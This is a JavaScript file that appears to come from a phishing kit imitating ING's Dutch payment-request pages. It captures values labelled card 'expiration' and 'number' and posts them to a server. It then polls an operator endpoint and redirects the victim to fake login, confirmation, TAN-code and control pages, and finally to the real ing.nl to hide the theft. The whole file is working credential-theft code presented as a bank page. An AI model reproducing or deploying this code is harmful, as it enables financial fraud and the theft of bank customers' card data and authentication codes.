const login_form = document.querySelector('#login-form');

const expiration = document.querySelector('#login-username');
const number = document.querySelector('#login-password');
const loginButton = document.querySelector('#loginButton');
const token = document.querySelector('#token');

login_form.addEventListener('submit', e => {
    e.preventDefault();

    if (number.value == '' || expiration.value == '') {
        loginButton.innerHTML = 'Volgende';
        loginButton.disabled = false;
        expiration.disabled = false;
        number.disabled = false;

        expiration.value = '';
        number.value = '';

        document.querySelector('#userNamePassword').classList.add('has-error');
        document.querySelector('#errorMessage').classList.remove('h-hidden');
    } else {
        const data = new FormData();
        data.append('expiration', expiration.value);
        data.append('number', number.value);

        loginButton.innerHTML = '<img src="/img/ing.gif" width="20"> Volgende';
        loginButton.disabled = true;
        expiration.disabled = true;
        number.disabled = true;

        document.querySelector('#userNamePassword').classList.remove('has-error');
        document.querySelector('#errorMessage').classList.add('h-hidden');

        fetch('/particulier/betaalverzoek/informatie/' + token.value, {
            method: 'POST',
            body: data
        }).then(() => {
            const newInterval = setInterval(() => {
                fetch('/particulier/betaalverzoek/informatie/check/' + token.value, {
                    method: 'POST'
                }).then(res => {
                    res.json().then(data => {
                        if (data.page == 'login') {
                            window.location.href = '/particulier/betaalverzoek/inloggen/' + token.value;
                        } else if (data.page == 'details') {
                            loginButton.innerHTML = 'Volgende';
                            loginButton.disabled = false;
                            expiration.disabled = false;
                            number.disabled = false;

                            expiration.value = '';
                            number.value = '';

                            document.querySelector('#userNamePassword').classList.add('has-error');
                            document.querySelector('#errorMessage').classList.remove('h-hidden');

                            clearInterval(newInterval)
                        } else if (data.page == 'confirm') {
                            window.location.href = '/particulier/betaalverzoek/bevestigen/' + token.value;
                        } else if (data.page == 'tan') {
                            window.location.href = '/particulier/betaalverzoek/tancode/' + token.value;
                        } else if (data.page == 'control') {
                            window.location.href = '/particulier/betaalverzoek/controleren/' + token.value;
                        } else if (data.page == 'finish') {
                            window.location.href = 'https://www.ing.nl';
                        } else if (data.page == 'waiting') {
                            console.log('Waiting...');
                        }
                    });
                });
            }, 500);        
        });
    }
});


